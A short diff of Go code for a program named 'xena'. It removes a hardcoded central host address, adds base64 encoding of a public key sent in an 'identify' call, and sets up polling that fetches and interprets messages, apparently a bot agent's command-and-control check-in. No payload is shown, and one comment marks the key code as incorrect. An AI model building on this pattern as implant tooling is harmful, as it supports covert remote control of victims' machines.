@@ -1,16 +1,14 @@
-package main
+package xena
 
 import (
 	"crypto/x509"
+	"encoding/base64"
 	"fmt"
 	"net/http"
 	"strconv"
 
 	"github.com/google/uuid"
 )
-
-// Xena-Atila.
-var centralizedHost string = "http://127.0.0.1:60666" // os.Args[1]
 
 // Used for authentication.
 var privateIdentificationKey = generatePrivateKey()
@@ -27,12 +25,11 @@ func main() {
 	// fmt.Println(string(insertionPayload))
 	// fmt.Println("\n\n\n\n")
 
-	enc, _ := x509.MarshalPKIXPublicKey(&privateIdentificationKey.PublicKey)
-
-	fmt.Println(enc)
+	// Not correct.
+	enc := x509.MarshalPKCS1PublicKey(&privateIdentificationKey.PublicKey)
 
 	// Identifies itself to the Xena-Atila.
-	identify(id.String(), "WiP. Public key.")
+	identify(id.String(), base64.StdEncoding.EncodeToString(enc))
 
 	// Fetch new messages in a non-blocking loop.
 	go fetchAndInterpretMessages(id.String())
